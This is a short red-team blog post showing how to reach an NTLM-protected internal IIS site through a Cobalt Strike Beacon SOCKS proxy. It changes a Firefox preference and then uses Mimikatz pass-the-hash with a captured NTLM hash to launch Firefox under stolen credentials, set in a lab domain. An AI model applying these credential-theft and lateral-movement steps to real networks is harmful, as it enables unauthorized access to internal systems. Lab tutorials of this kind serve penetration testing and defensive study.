---
title: "NTLM Authentication with Firefox & FoxyProxy"
date: 2022-06-17T09:57:19+01:00
draft: false
authors:
    - RastaMouse
---

It's common for organisations to host internal web applications that are configured for single sign-on, backed by Active Directory.  Even though Kerberos is becoming more common, NTLM is still more ubiquitous (especially for legacy apps).  This short post will demonstate how to authenticate to a web app over a SOCKS proxy, using NTLM.

I'm running the default IIS web page on a Windows Server.  Under the Authentication settings, I've disabled Anonymous Auth and only enabled the NTLM provider under Windows Auth.

![](/images/ntlm-auth/iis-auth-settings.png "IIS Authentication Settings")

As a member of the domain, we can see the IIS landing page.

![](/images/ntlm-auth/domain-user.png "IIS Landing Page")

If we have a Beacon running as a domain user, we can start the SOCKS proxy and configure FoxyProxy to point to the IP/port of your Team Server.

```
beacon> getuid
[*] You are DEV\rasta

beacon> socks 1080
[+] started SOCKS4a server on: 1080
```

![](/images/ntlm-auth/foxy-proxy.png "FoxyProxy")

As you can probably guess, we're unable to access the IIS landing page because we have no credentials.

![](/images/ntlm-auth/unauthorized.png "IIS Unauthorized")

First, we need to modify one of the "hidden" Firefox preferences.  Enter `about:config` into the address bar and search for the `network.automatic-ntlm-auth.trusted-uris` preference item. Add the URL, `http://192.168.56.1` in my case and click the little tick button.  Then close Firefox.

To provide the credential material, we can launch Firefox using Mimikatz' Pass-the-Hash capability (how you get the NTLM hash in the first place is of course up to you).

```
  .#####.   mimikatz 2.2.0 (x64) #19041 May 13 2022 10:13:10
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::pth /domain:dev.lab /user:rasta /rc4:FC525C9683E8FE067095BA2DDC971889 /run:"C:\Program Files\Mozilla Firefox\firefox.exe"
user    : rasta
domain  : dev.lab
program : C:\Program Files\Mozilla Firefox\firefox.exe
impers. : no
NTLM    : fc525c9683e8fe067095ba2ddc971889
  |  PID  24428
  |  TID  7744
  |  LSA Process is now R/W
  |  LUID 0 ; 1341041463 (00000000:4feeab37)
  \_ msv1_0   - data copy @ 0000029A8FDD0AC0 : OK !
  \_ kerberos - data copy @ 0000029A8FCC44A8
   \_ des_cbc_md4       -> null
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ *Password replace @ 0000029A8FDA7428 (32) -> null
```

> It's also worth noting, that if the web app accepted plaintext domain creds, we could launch Firefox using `runas /netonly`.

Navigating to the URL now gives us access.

![](/images/ntlm-auth/authorized.png "IIS Authorized")